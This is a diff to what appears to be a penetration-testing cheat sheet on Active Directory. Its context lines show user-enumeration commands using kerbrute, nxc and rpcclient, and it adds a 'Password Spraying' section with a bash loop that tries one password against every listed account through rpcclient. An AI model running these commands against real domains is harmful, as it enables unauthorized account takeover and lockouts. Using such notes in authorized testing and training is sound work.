@@ -75,3 +75,9 @@ kerbrute userenum -d domain.tld --dc <ip-dc> /wordlist/path -o valid_ad_users
 nxc smb <ip> -u '<user>' -p '<password>' --users
 rpcclient -U '<user>' --password '<password>' <ip>
 ```
+
+### Password Spraying
+
+```bash
+for u in $(cat users.txt);do rpcclient -U "$u%" --password '<password>' -c "getusername;quit" <ip> | grep Authority; done
+```
